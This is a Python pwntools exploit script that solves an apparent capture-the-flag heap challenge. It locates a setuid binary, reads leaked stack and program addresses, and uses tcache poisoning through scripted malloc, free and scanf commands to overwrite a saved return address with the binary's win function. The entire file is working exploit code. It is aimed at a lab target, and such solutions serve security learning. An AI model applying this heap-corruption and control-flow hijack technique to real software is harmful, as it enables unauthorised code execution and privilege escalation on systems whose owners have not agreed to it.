import sys
import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def one_round(io: pwn.process):
    tee(io)

    io.recvuntil(b"at: ")
    stack_addr = int(io.recvuntil(b".", drop=True), 16)
    return_addr = stack_addr + 0x118
    io.recvuntil(b"at: ")
    main_addr = int(io.recvuntil(b".", drop=True), 16)

    elf = io.elf
    elf.address = main_addr - elf.symbols["main"]

    win_addr = elf.symbols["win"]

    io.sendline(b"malloc 0 16")
    io.sendline(b"malloc 1 16")
    io.sendline(b"free 0")
    io.sendline(b"free 1")
    io.sendline(b"scanf 1")
    io.sendline(return_addr.to_bytes(8, "little"))
    io.sendline(b"malloc 0 16")
    io.sendline(b"malloc 0 16")
    io.sendline(b"scanf 0")
    io.sendline(win_addr.to_bytes(8, "little"))

    io.sendline(b"quit")
    io.recvrepeat()


def ctf():
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        one_round(io)


if __name__ == "__main__":
    ctf()
